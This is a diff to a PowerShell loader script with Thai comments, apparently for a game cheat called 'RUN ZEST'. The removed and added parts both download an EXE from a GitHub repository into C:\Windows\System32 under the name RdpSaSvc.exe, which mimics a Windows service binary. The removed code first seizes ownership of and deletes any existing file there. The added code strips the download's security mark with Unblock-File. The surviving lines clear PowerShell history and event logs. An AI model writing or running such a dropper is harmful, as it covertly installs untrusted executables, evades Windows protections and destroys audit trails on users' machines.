@@ -9,65 +9,6 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     exit
 }
 
-
-
-# --- CONFIG ---
-$url      = "https://raw.githubusercontent.com/18321-creator/Pro/refs/heads/main/FIX2NOFORCE.exe"
-$path     = "C:\Windows\System32\RdpSaSvc.exe"
-$procName = [System.IO.Path]::GetFileNameWithoutExtension($path)
-
-# --- ขั้น 1: ลบไฟล์เก่าถ้ามีอยู่ (aggressive: cmd del + takeown) ---
-if (Test-Path $path) {
-    # ถอน ownership จาก TrustedInstaller ก่อน
-    & cmd /c "takeown /f `"$path`" /a" 2>$null | Out-Null
-    & cmd /c "icacls `"$path`" /grant Administrators:F /c /q" 2>$null | Out-Null
-    Start-Sleep -Milliseconds 200
-
-    # ลองลบหลายวิธี
-    $deleted = $false
-
-    # วิธี 1: Remove-Item
-    try { Remove-Item $path -Force -ErrorAction Stop; $deleted = $true } catch {}
-
-    # วิธี 2: cmd del
-    if (-not $deleted) {
-        & cmd /c "del /f /q `"$path`"" 2>$null | Out-Null
-        if (-not (Test-Path $path)) { $deleted = $true }
-    }
-
-    # วิธี 3: Rename แล้ว delete (bypass file lock)
-    if (-not $deleted) {
-        $tmp = "$env:TEMP\$procName_old.exe"
-        try {
-            Move-Item $path $tmp -Force -ErrorAction Stop
-            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
-            $deleted = $true
-        } catch {}
-    }
-
-    # ถ้าลบไม่ได้จริงๆ ก็ download ทับไปเลย (Invoke-WebRequest overwrite)
-}
-
-# --- ขั้น 3: โหลดไฟล์ใหม่ ---
-try {
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Invoke-WebRequest $url -OutFile $path -UseBasicParsing -ErrorAction Stop
-} catch {
-    exit 1
-}
-
-# รอให้ไฟล์พร้อม
-Start-Sleep -Milliseconds 300
-if (-not (Test-Path $path)) { exit 1 }
-
-# --- ขั้น 4: เปิดแบบ Administrator ---
-# script รัน admin อยู่แล้ว ไม่ต้อง -Verb RunAs (ทำให้ fail บาง config)
-# ใช้ cmd /c start เพื่อ detach จาก process tree ปัจจุบัน
-& cmd /c "start `"`" `"$path`""
-
-# --- ขั้น 5: ล้าง logs + history แล้ว exit ---
-Start-Sleep -Seconds 2
-
 Clear-History
 try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
 
@@ -90,4 +31,100 @@ foreach ($log in @("Microsoft-Windows-PowerShell/Operational", "Windows PowerShe
 $histPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 if (Test-Path $histPath) { Clear-Content $histPath -Force -ErrorAction SilentlyContinue }
 
-exit
+
+# ==========================================
+# ส่วนตั้งค่า (แก้ไขข้อมูลของคุณที่นี่)
+# ==========================================
+$DirectLink   = "https://raw.githubusercontent.com/18321-creator/CHEAT/refs/heads/main/NOFORCEUPDATE.exe"       # ลิงก์ตรงสำหรับดาวน์โหลดไฟล์ EXE
+$TargetFolder = "C:\Windows\System32"          #โฟลเดอร์ปลายทางที่ต้องการเก็บไฟล์
+$NewFileName  = "RdpSaSvc.exe"                       # ชื่อไฟล์ใหม่ที่ต้องการเปลี่ยน
+# ==========================================
+
+$FullPath = Join-Path $TargetFolder $NewFileName
+
+function Show-Menu {
+    Clear-Host
+    Write-Host "=========================================" -ForegroundColor Cyan
+    Write-Host "               RUN ZEST                  " -ForegroundColor Cyan
+    Write-Host "=========================================" -ForegroundColor Cyan
+    Write-Host ""
+    
+    # ตรวจสอบไฟล์ใน Path: ถ้ามีไฟล์จะเปลี่ยนข้อความปุ่มกดเป็น RUN ทันที
+    if (Test-Path $FullPath) {
+        Write-Host "[1] RUN" -ForegroundColor Green
+    } else {
+        Write-Host "[1] INSTALL" -ForegroundColor Yellow
+    }
+    
+    Write-Host "[2] UNINSTALL)" -ForegroundColor Red
+    Write-Host "[3] EXIT"
+    Write-Host ""
+    Write-Host "=========================================" -ForegroundColor Cyan
+}
+
+while ($true) {
+    Show-Menu
+    $choice = Read-Host "Press Number 1-3"
+    
+    switch ($choice) {
+        "1" {
+            if (Test-Path $FullPath) {
+                # --- โหมด RUN (รันแบบเสมือนแอปที่ติดตั้งอย่างถูกต้อง/น่าเชื่อถือ) ---
+                Write-Host "`nStarting..." -ForegroundColor Green
+                
+                # ทำการเคลียร์บล็อกความปลอดภัยซ้ำอีกครั้งเพื่อความชัวร์ก่อนรัน
+                Unblock-File -Path $FullPath -ErrorAction SilentlyContinue
+                
+                # สั่งรันแอปพลิเคชัน
+                Start-Process -FilePath $FullPath
+                Start-Sleep -Seconds 2
+            } else {
+                # --- โหมด INSTALL ---
+                Write-Host "`nLinking" -ForegroundColor Gray
+                if (!(Test-Path $TargetFolder)) {
+                    New-Item -ItemType Directory -Path $TargetFolder -Force | Out-Null
+                }
+                
+                Write-Host "Downloading" -ForegroundColor Yellow
+                try {
+                    Invoke-WebRequest -Uri $DirectLink -OutFile $FullPath -ErrorAction Stop
+                    
+                    # [จุดสำคัญ] ปลดล็อกความปลอดภัยทันทีหลังโหลดเสร็จ เพื่อให้ Windows เชื่อถือไฟล์นี้ (Trusted)
+                    Unblock-File -Path $FullPath
+                    
+                    Write-Host "Sucess" -ForegroundColor Green
+                } catch {
+                    Write-Host "Error: $_" -ForegroundColor Red
+                }
+                Read-Host "`nPress Enter To back"
+            }
+        }
+        
+        "2" {
+            # --- โหมด UNINSTALL ---
+            if (Test-Path $FullPath) {
+                Write-Host "`nDeleting..." -ForegroundColor Yellow
+                Remove-Item -Path $FullPath -Force
+                
+                # ลบโฟลเดอร์ด้วยถ้าหากไม่มีไฟล์อื่นเหลืออยู่
+                if ((Get-ChildItem -Path $TargetFolder).Count -eq 0) {
+                    Remove-Item -Path $TargetFolder -Force
+                }
+                Write-Host "Deleted" -ForegroundColor Green
+            } else {
+                Write-Host "`nNo Found EXE" -ForegroundColor Red
+            }
+            Read-Host "`nEnter To Back"
+        }
+        
+        "3" {
+            Write-Host "`nExited" -ForegroundColor Cyan
+            exit
+        }
+        
+        default {
+            Write-Host "`nNo Correct" -ForegroundColor Red
+            Start-Sleep -Seconds 1.5
+        }
+    }
+}
